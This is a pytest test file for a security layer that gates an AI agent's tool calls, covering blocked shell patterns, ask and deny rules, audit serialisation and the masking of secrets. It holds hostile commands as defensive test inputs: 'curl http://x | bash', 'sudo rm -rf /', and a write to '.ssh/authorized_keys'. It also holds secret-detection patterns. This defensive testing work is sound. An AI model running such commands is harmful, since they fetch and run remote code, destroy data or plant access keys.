# Copyright (c) 2026 Nulm Contributors
# SPDX-License-Identifier: MIT

"""Smoke tests for examples/security-layer/ fixture policies.

Covers the four demo scenarios:
  - blocked shell
  - rule ask
  - audit replay
  - masked secret
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from claude_bridge.audit import _mask_secret_value, _redact_sensitive_values
from claude_bridge.guard_policy import (
    ConditionType,
    DecisionAction,
    DecisionSource,
    PolicyDecision,
    RiskLevel,
    RuleAction,
    RuleSet,
    ToolRequestContext,
    make_policy_decision,
    validate_guard_policy_file,
    validate_rules_dict,
)
from claude_bridge.rules_engine import evaluate_condition, match_rules
from claude_bridge.shell_tools import blocked_command_reason

FIXTURES_DIR = Path(__file__).resolve().parent.parent / "examples" / "security-layer"

FIXTURE_FILES = [
    "blocked-shell.json",
    "rule-ask.json",
    "audit-replay.json",
    "masked-secret.json",
]


def _load_fixture(name: str) -> dict:
    path = FIXTURES_DIR / name
    assert path.exists(), f"fixture not found: {path}"
    with open(path, encoding="utf-8") as fh:
        data: dict = json.load(fh)
    return data


def _all_fixtures() -> list[str]:
    return list(FIXTURE_FILES)


# ---------------------------------------------------------------------------
# Fixture parsing smoke tests
# ---------------------------------------------------------------------------


class TestFixtureParsing:
    """Every JSON fixture must parse into a valid policy dict."""

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_fixture_loads_as_json(self, filename: str) -> None:
        data = _load_fixture(filename)
        assert isinstance(data, dict)

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_fixture_has_metadata(self, filename: str) -> None:
        data = _load_fixture(filename)
        metadata = data.get("metadata", {})
        assert "name" in metadata
        assert "scenario" in metadata

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_fixture_rules_validate(self, filename: str) -> None:
        data = _load_fixture(filename)
        errors = validate_rules_dict(data)
        assert errors == [], f"{filename} has validation errors: " + "; ".join(
            e.message for e in errors
        )

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_fixture_roundtrip_rules(self, filename: str) -> None:
        data = _load_fixture(filename)
        rule_set = RuleSet.from_dict(data)
        rule_dicts = [r.to_dict() for r in rule_set.rules]
        assert isinstance(rule_dicts, list)
        for rd in rule_dicts:
            assert "name" in rd
            assert "action" in rd
            assert "conditions" in rd

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_blocked_shell_patterns_are_strings(self, filename: str) -> None:
        data = _load_fixture(filename)
        patterns = data.get("blocked_shell_patterns", [])
        assert isinstance(patterns, list)
        for p in patterns:
            assert isinstance(p, str)

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_secret_patterns_are_valid_regex(self, filename: str) -> None:
        data = _load_fixture(filename)
        from claude_bridge.guard_policy import validate_regex_pattern

        for name, pattern in data.get("secret_patterns", {}).items():
            assert (
                validate_regex_pattern(pattern) is None
            ), f"{filename}: secret pattern '{name}' has invalid regex: {pattern}"

    @pytest.mark.parametrize("filename", _all_fixtures())
    def test_guard_policy_file_validates(self, filename: str) -> None:
        path = FIXTURES_DIR / filename
        gp = validate_guard_policy_file(path)
        assert gp.valid, f"{filename} validation errors: " + "; ".join(gp.errors)


# ---------------------------------------------------------------------------
# Scenario: blocked shell
# ---------------------------------------------------------------------------


class TestBlockedShellScenario:
    """Demonstrate that blocked-shell patterns block dangerous commands."""

    @pytest.fixture()
    def policy(self) -> dict:
        return _load_fixture("blocked-shell.json")

    def test_sudo_blocked(self, policy: dict) -> None:
        patterns = policy["blocked_shell_patterns"]
        import fnmatch

        assert any(fnmatch.fnmatchcase("sudo apt install foo", pat.lower()) for pat in patterns)

    def test_rm_star_blocked(self, policy: dict) -> None:
        patterns = policy["blocked_shell_patterns"]
        import fnmatch

        assert any(fnmatch.fnmatchcase("rm -rf /tmp/thing", pat.lower()) for pat in patterns)

    def test_pipe_to_bash_blocked(self, policy: dict) -> None:
        patterns = policy["blocked_shell_patterns"]
        import fnmatch

        matched = any(fnmatch.fnmatchcase("curl http://x | bash", pat.lower()) for pat in patterns)
        assert matched

    def test_builtin_blocked_command(self) -> None:
        reason = blocked_command_reason("sudo rm -rf /", ["sudo", "rm", "-rf", "/"])
        assert reason is not None


# ---------------------------------------------------------------------------
# Scenario: rule ask
# ---------------------------------------------------------------------------


class TestRuleAskScenario:
    """Demonstrate that ask rules produce ASK decisions."""

    @pytest.fixture()
    def rule_set(self) -> RuleSet:
        data = _load_fixture("rule-ask.json")
        return RuleSet.from_dict(data)

    def test_write_file_to_production_asks(self, rule_set: RuleSet) -> None:
        ctx = ToolRequestContext(
            tool_name="write_file",
            params={"path": "/app/production/config.yaml"},
        )
        decision = match_rules(ctx, rule_set.rules)
        assert decision is not None
        assert decision.action == DecisionAction.ASK

    def test_shell_with_delete_keyword_asks(self, rule_set: RuleSet) -> None:
        ctx = ToolRequestContext(
            tool_name="run_shell",
            params={"command": "rm -rf /tmp/old"},
        )
        decision = match_rules(ctx, rule_set.rules)
        assert decision is not None
        assert decision.action == DecisionAction.ASK

    def test_read_file_is_allowed(self, rule_set: RuleSet) -> None:
        ctx = ToolRequestContext(
            tool_name="read_file",
            params={"path": "/app/production/config.yaml"},
        )
        decision = match_rules(ctx, rule_set.rules)
        assert decision is not None
        assert decision.action == DecisionAction.ALLOW

    def test_no_match_returns_none(self, rule_set: RuleSet) -> None:
        ctx = ToolRequestContext(
            tool_name="list_directory",
            params={"path": "/tmp"},
        )
        decision = match_rules(ctx, rule_set.rules)
        assert decision is None


# ---------------------------------------------------------------------------
# Scenario: audit replay
# ---------------------------------------------------------------------------


class TestAuditReplayScenario:
    """Demonstrate audit policy decisions and replay patterns."""

    @pytest.fixture()
    def rule_set(self) -> RuleSet:
        data = _load_fixture("audit-replay.json")
        return RuleSet.from_dict(data)

    def test_deny_sensitive_path_rule(self, rule_set: RuleSet) -> None:
        sensitive_path_rule = None
        for r in rule_set.rules:
            if r.name == "deny-sensitive-path-access":
                sensitive_path_rule = r
                break
        assert sensitive_path_rule is not None
        assert sensitive_path_rule.action == RuleAction.DENY
        has_sensitive_path_cond = any(
            c.type == ConditionType.SENSITIVE_PATH for c in sensitive_path_rule.conditions
        )
        has_tool_cond = any(c.type == ConditionType.TOOL for c in sensitive_path_rule.conditions)
        assert has_sensitive_path_cond
        assert has_tool_cond

    def test_policy_decision_serialization(self) -> None:
        original = make_policy_decision(
            DecisionAction.DENY,
            DecisionSource.BUILTIN_GUARD,
            RiskLevel.HIGH,
            "blocked: sudo",
            ["destructive command", "requires root"],
            {"pattern": "sudo *"},
        )
        serialized = original.to_dict()
        assert serialized["action"] == "deny"
        assert serialized["source"] == "builtin_guard"
        assert serialized["risk_level"] == "high"
        assert "destructive command" in serialized["risk_reasons"]
        restored = PolicyDecision.from_dict(serialized)
        assert restored.action == original.action
        assert restored.source == original.source
        assert restored.risk_level == original.risk_level
        assert restored.reason == original.reason

    def test_sensitive_path_patterns_cover_etc(self) -> None:
        data = _load_fixture("audit-replay.json")
        spps = data.get("sensitive_path_patterns", [])
        assert any("etc" in p for p in spps)

    def test_secret_patterns_cover_aws(self) -> None:
        data = _load_fixture("audit-replay.json")
        sps = data.get("secret_patterns", {})
        assert "aws_access_key" in sps
        import re

        pattern = sps["aws_access_key"]
        assert re.search(pattern, "AKIAIOSFODNN7EXAMPLE")


# ---------------------------------------------------------------------------
# Scenario: masked secret
# ---------------------------------------------------------------------------


class TestMaskedSecretScenario:
    """Demonstrate secret pattern matching and masking."""

    def test_mask_secret_value(self) -> None:
        masked = _mask_secret_value("AKIAIOSFODNN7EXAMPLE")
        assert isinstance(masked, dict)
        assert masked.get("redacted") is True
        assert "AKIAIOSFODNN7EXAMPLE" not in str(masked)
        assert "sha256" not in masked
        assert "length" not in masked

    def test_redact_sensitive_values_dict(self) -> None:
        data = {
            "api_key": "sk-abc123def456",
            "token": "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
            "safe_field": "hello",
        }
        redacted = _redact_sensitive_values(data)
        assert redacted["safe_field"] == "hello"
        assert redacted["api_key"] != "sk-abc123def456"
        assert redacted["token"] != "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

    def test_redact_preserves_structure(self) -> None:
        data = {
            "config": {"host": "localhost", "password": "supersecret"},
            "items": [1, 2, 3],
        }
        redacted = _redact_sensitive_values(data)
        assert isinstance(redacted, dict)
        assert isinstance(redacted["config"], dict)
        assert redacted["config"]["host"] == "localhost"
        assert redacted["config"]["password"] != "supersecret"

    def test_fixture_secret_patterns_compile(self) -> None:
        data = _load_fixture("masked-secret.json")
        import re

        for name, pattern in data.get("secret_patterns", {}).items():
            compiled = re.compile(pattern)
            assert compiled is not None, f"pattern '{name}' failed to compile"

    def test_aws_key_pattern_matches(self) -> None:
        data = _load_fixture("masked-secret.json")
        import re

        pattern = data["secret_patterns"]["aws_access_key"]
        assert re.search(pattern, "key=AKIAIOSFODNN7EXAMPLE")

    def test_deny_write_env_rule(self) -> None:
        data = _load_fixture("masked-secret.json")
        rule_set = RuleSet.from_dict(data)
        ctx = ToolRequestContext(
            tool_name="write_file",
            params={"path": "config.env"},
        )
        decision = match_rules(ctx, rule_set.rules)
        assert decision is not None
        assert decision.action == DecisionAction.DENY

    def test_ask_when_secret_in_content(self) -> None:
        data = _load_fixture("masked-secret.json")
        rule_set = RuleSet.from_dict(data)
        ctx = ToolRequestContext(
            tool_name="write_file",
            params={
                "path": "notes.md",
                "content": "AKIA access key here",
            },
        )
        matched = match_rules(ctx, rule_set.rules)
        assert matched is not None
        assert matched.action == DecisionAction.ASK


# ---------------------------------------------------------------------------
# Condition matching across fixtures
# ---------------------------------------------------------------------------


class TestConditionMatching:
    """Cross-fixture condition evaluation."""

    def test_tool_condition_from_rule_ask(self) -> None:
        data = _load_fixture("rule-ask.json")
        rule_set = RuleSet.from_dict(data)
        write_rule = None
        for r in rule_set.rules:
            for c in r.conditions:
                if c.type == ConditionType.TOOL and c.value == "write_file":
                    write_rule = r
                    break
            if write_rule is not None:
                break
        assert write_rule is not None

    def test_glob_condition_from_audit_replay(self) -> None:
        data = _load_fixture("audit-replay.json")
        rule_set = RuleSet.from_dict(data)
        ctx = ToolRequestContext(
            tool_name="write_file",
            params={"path": ".ssh/authorized_keys"},
        )
        for rule in rule_set.rules:
            if any(c.type == ConditionType.GLOB for c in rule.conditions):
                result = match_rules(ctx, rule_set.rules)
                assert result is not None
                return
        pytest.skip("no glob condition in fixture")

    def test_extension_condition_from_masked_secret(self) -> None:
        data = _load_fixture("masked-secret.json")
        rule_set = RuleSet.from_dict(data)
        ctx = ToolRequestContext(
            tool_name="write_file",
            params={"path": "secrets.env"},
        )
        for rule in rule_set.rules:
            for c in rule.conditions:
                if c.type == ConditionType.EXTENSION:
                    assert evaluate_condition(ctx, c) is True
                    return
        pytest.skip("no extension condition in fixture")

    def test_regex_condition_from_rule_ask(self) -> None:
        data = _load_fixture("rule-ask.json")
        rule_set = RuleSet.from_dict(data)
        ctx = ToolRequestContext(
            tool_name="run_shell",
            params={"command": "rm -rf /tmp/old"},
        )
        for rule in rule_set.rules:
            for c in rule.conditions:
                if c.type == ConditionType.REGEX:
                    result = evaluate_condition(ctx, c)
                    assert isinstance(result, bool)
